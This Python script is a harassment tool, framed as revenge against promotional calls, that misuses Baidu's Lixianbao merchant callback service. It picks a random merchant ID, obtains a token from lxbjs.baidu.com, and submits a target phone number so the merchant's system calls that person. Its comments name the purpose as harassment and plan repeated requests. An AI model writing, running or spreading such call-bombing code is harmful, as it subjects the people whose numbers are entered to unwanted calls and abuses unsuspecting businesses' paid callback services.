""" 排山倒海的推广电话，吾辈当以毒攻毒 """
import requests
import time
import random
import re
import json
from flask import abort


def start_call(phone):
    """
    这里就是骚扰电话的逻辑了，借用百度离线宝
    
    :param phone:
    :return True, False
    """
    # 配置参数
    f = 55
    id = random.randint(1, 92000)  # 随机一个离线宝商户进行骚扰
    g = 0
    _ = t = int(time.time() * 1000)
    t = int(time.time() * 1000 + 320)
    r = ''
    callback = 'jQuery11110595526036238333_' + str(int(time.time() * 1000))

    # 自定义headers
    my_headers = {
        'Accept':
        'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
        'Accept-Encoding':
        'gzip, deflate',
        'Accept-Language':
        'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection':
        'keep-alive',
        'Host':
        'lxbjs.baidu.com',
        'Referer':
        'http://lxbjs.baidu.com/cb/url/show?f={f}&id={id}'.format(f=f, id=id),
        'User-Agent':
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
        'X-Requested-With':
        'XMLHttpRequest'
    }

    # 配置token_url
    get_token_url = 'http://lxbjs.baidu.com/cb/url/check'

    # 构建参数
    params = {
        'callback': callback,
        'f': f,
        'id': id,
        'g': g,
        't': t,
        'r': r,
        '_': _
    }

    # 使用session
    sss = requests.Session()

    # 获取token
    print('获取Token....')
    request = sss.get(get_token_url, params=params)

    try:
        tk = loads_jsonp(request.text)['data']['tk']
    except KeyError:
        return abort(401)

    if tk:
        print('获取成功，Token: {tk}'.format(tk=tk))
    else:
        print('获取失败，请重试')
        return False

    # 配置call_url
    get_call_url = 'http://lxbjs.baidu.com/cb/call'

    # 设置参数
    params = {
        'callback': callback,
        'f': f,
        'id': id,
        'tk': tk,
        'vtel': phone,
        '_': _ + 1
    }

    # 提交打电话申请
    print('骚扰号码：{phone}'.format(phone=phone))
    request = sss.get(get_call_url, params=params)

    if request.status_code == 200:
        try:
            res_json = loads_jsonp(request.text)
        except:
            raise ValueError('Invalid jsonp input')

        print(res_json)
        # 分析: res_json['status'] 为0时，会自动接通商户，大概率会很快收到电话骚扰。非0时，会短信通知商户，这种情况下可能不会电话骚扰或不会立即电话骚扰。

        # Todo: 状态非0时，尝试继续提交DISS请求

        return True
    else:
        print('失败，{error}'.format(error=request.content))
        return False


def loads_jsonp(_jsonp):
    """ 
    解析jsonp
    
    # 作者：阿阿聪
    # 链接：https://www.zhihu.com/question/52841349/answer/132564221
    # 来源：知乎
    # 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

    :param _jsonp
    :return json
    """
    try:
        return json.loads(re.match(".*?({.*}).*", _jsonp, re.S).group(1))
    except:
        raise ValueError('Invalid Input')
